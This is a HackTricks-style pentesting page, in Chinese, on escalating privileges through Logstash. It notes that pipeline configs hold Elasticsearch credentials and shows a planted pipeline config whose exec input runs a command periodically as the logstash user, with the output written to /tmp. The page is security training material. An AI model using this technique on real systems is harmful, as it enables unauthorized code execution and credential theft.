{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash 用于 **收集、转换和分发日志**，通过一个称为 **管道** 的系统。这些管道由 **输入**、**过滤** 和 **输出** 阶段组成。当 Logstash 在被攻陷的机器上运行时，会出现一个有趣的方面。

### Pipeline Configuration

管道在文件 **/etc/logstash/pipelines.yml** 中配置，该文件列出了管道配置的位置：
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
该文件揭示了包含管道配置的 **.conf** 文件的位置。当使用 **Elasticsearch output module** 时，**pipelines** 通常包含 **Elasticsearch credentials**，这些凭据由于 Logstash 需要将数据写入 Elasticsearch，通常具有广泛的权限。配置路径中的通配符允许 Logstash 执行指定目录中所有匹配的管道。

### 通过可写管道进行权限提升

要尝试权限提升，首先识别 Logstash 服务运行的用户，通常是 **logstash** 用户。确保满足 **以下** 条件之一：

- 拥有对管道 **.conf** 文件的 **写访问** **或**
- **/etc/logstash/pipelines.yml** 文件使用了通配符，并且您可以写入目标文件夹

此外，必须满足 **以下** 条件之一：

- 能够重启 Logstash 服务 **或**
- **/etc/logstash/logstash.yml** 文件中设置了 **config.reload.automatic: true**

鉴于配置中存在通配符，创建一个与该通配符匹配的文件可以执行命令。例如：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
这里，**interval** 决定了执行频率（以秒为单位）。在给定的示例中，**whoami** 命令每 120 秒运行一次，其输出被定向到 **/tmp/output.log**。

在 **/etc/logstash/logstash.yml** 中设置 **config.reload.automatic: true**，Logstash 将自动检测并应用新的或修改过的管道配置，而无需重启。如果没有通配符，仍然可以对现有配置进行修改，但建议谨慎操作以避免中断。

## References

{{#include ../../banners/hacktricks-training.md}}
